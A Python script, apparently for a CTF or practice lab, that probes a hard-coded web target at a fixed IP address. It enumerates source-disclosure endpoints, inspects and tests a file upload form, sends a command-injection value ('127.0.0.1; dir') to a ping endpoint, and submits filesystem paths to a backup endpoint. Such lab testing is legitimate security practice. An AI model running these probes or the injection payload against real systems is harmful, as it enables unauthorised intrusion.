import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def view_upload_source():
    """查看上传源码"""
    print_section("1. 查看上传源码")
    
    url = f"{TARGET}/upload-source"
    try:
        r = session.get(url, timeout=TIMEOUT)
        print(f"\n  状态码: {r.status_code}")
        print(f"\n  源码内容:\n{r.text}")
        
    except Exception as e:
        print(f"  错误: {e}")


def view_all_sources():
    """查看所有源码"""
    print_section("2. 查看所有源码")
    
    source_paths = [
        "/upload-source",
        "/source",
        "/code",
        "/src",
        "/api-source",
        "/login-source",
        "/search-source",
        "/ping-source",
        "/backup-source",
        "/include-source",
        "/message-source",
    ]
    
    for path in source_paths:
        url = f"{TARGET}{path}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            if r.status_code == 200:
                print(f"\n  ✅ {path}")
                print(f"     内容: {r.text[:500]}")
                
        except:
            pass


def check_upload_form():
    """检查上传表单结构"""
    print_section("3. 检查上传表单")
    
    url = f"{TARGET}/upload"
    try:
        r = session.get(url, timeout=TIMEOUT)
        
        # 提取表单
        forms = re.findall(r'<form[^>]*>(.*?)</form>', r.text, re.DOTALL)
        if forms:
            print(f"\n  表单HTML:\n{forms[0]}")
            
            # 提取enctype
            enctype = re.search(r'enctype=["\']([^"\']+)["\']', r.text)
            print(f"\n  enctype: {enctype.group(1) if enctype else '未指定'}")
            
            # 提取method
            method = re.search(r'method=["\']([^"\']+)["\']', r.text)
            print(f"  method: {method.group(1) if method else 'GET'}")
            
    except Exception as e:
        print(f"  错误: {e}")


def test_upload_proper():
    """正确方式测试文件上传"""
    print_section("4. 文件上传测试")
    
    url = f"{TARGET}/upload"
    try:
        r = session.get(url, timeout=TIMEOUT)
        
        csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
        csrf_token = csrf.group(1) if csrf else ""
        print(f"  CSRF Token: {csrf_token}")
        
        # 正确的文件上传格式
        files = {
            "file": ("test.png", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x10\x00\x00\x00\x10\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x04sBIT\x08\x08\x08\x08|\x88|\x88l\x88l\x88\x00\x00\x00\x1dIDATx\x9c\xed\xc1\x01\r\x00\x00\x00\xc2\xa0\xf7\xfd\xff?\xff\x00\x00\x00\x05\xff\x00\xff\x00\xff\x00\xff\x00\x00\x00\x00IEND\xaeB`\x82", "image/png")
        }
        
        r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
        
        print(f"\n  状态码: {r.status_code}")
        print(f"\n  完整响应:\n{r.text}")
        
    except Exception as e:
        print(f"  错误: {e}")


def test_ping_proper():
    """正确方式测试Ping"""
    print_section("5. Ping测试")
    
    url = f"{TARGET}/ping"
    
    # 尝试GET和POST
    for method in ["GET", "POST"]:
        for payload in ["127.0.0.1", "127.0.0.1; dir"]:
            try:
                if method == "GET":
                    r = session.get(url, params={"host": payload}, timeout=TIMEOUT)
                else:
                    r = session.post(url, data={"host": payload}, timeout=TIMEOUT)
                
                print(f"\n  [{method}] {r.status_code} ?host={payload}")
                
                # 提取响应主体
                body_match = re.search(r'<main[^>]*>(.*?)</main>', r.text, re.DOTALL)
                if body_match:
                    print(f"     响应: {body_match.group(1)[:500]}")
                else:
                    print(f"     响应: {r.text[:500]}")
                    
            except Exception as e:
                print(f"  错误: {e}")


def test_backup_proper():
    """正确方式测试Backup"""
    print_section("6. Backup测试")
    
    url = f"{TARGET}/backup"
    
    for method in ["GET", "POST"]:
        for payload in ["F:\\small peoject\\python-lab\\uploads", "F:\\small peoject\\python-lab"]:
            try:
                if method == "GET":
                    r = session.get(url, params={"path": payload}, timeout=TIMEOUT)
                else:
                    r = session.post(url, data={"path": payload}, timeout=TIMEOUT)
                
                print(f"\n  [{method}] {r.status_code} ?path={payload}")
                
                body_match = re.search(r'<main[^>]*>(.*?)</main>', r.text, re.DOTALL)
                if body_match:
                    print(f"     响应: {body_match.group(1)[:500]}")
                else:
                    print(f"     响应: {r.text[:500]}")
                    
            except Exception as e:
                print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF源码分析与测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    view_upload_source()
    view_all_sources()
    check_upload_form()
    test_upload_proper()
    test_ping_proper()
    test_backup_proper()
    
    print_section("分析完成")


if __name__ == "__main__":
    main()